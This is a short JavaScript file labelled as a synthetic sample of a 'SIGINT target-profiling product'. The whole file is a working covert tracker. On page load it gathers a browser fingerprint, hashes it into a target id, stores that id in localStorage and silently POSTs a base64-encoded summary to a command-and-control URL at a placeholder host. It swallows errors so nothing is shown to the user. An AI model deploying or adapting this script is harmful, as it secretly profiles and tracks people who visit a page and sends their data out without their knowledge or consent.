// SIGPROF — synthetic SIGINT target-profiling product sample.
(function () {
  var C2 = 'https://c2.example.test/profile';
  var started = Date.now();
  var profile = {
    ua: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: new Date().getTimezoneOffset(),
    screen: screen.width + 'x' + screen.height,
    cores: navigator.hardwareConcurrency,
    plugins: navigator.plugins.length,
    touch: navigator.maxTouchPoints
  };
  console.log('[SIGPROF] profile', JSON.stringify(profile));

  function summarize() {
    var material = JSON.stringify(profile) + '|' + (Date.now() - started);
    var hash = 0;
    for (var index = 0; index < material.length; index += 1) hash = (hash * 33 + material.charCodeAt(index)) >>> 0;
    return { id: hash.toString(16), dwell: Date.now() - started, profile: profile };
  }

  setTimeout(function () {
    var summary = summarize();
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify(summary)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('sigprof:id', summary.id); } catch (error) {}
    console.log('[SIGPROF] target id', summary.id, 'dwell', summary.dwell);
  }, 400);
})();
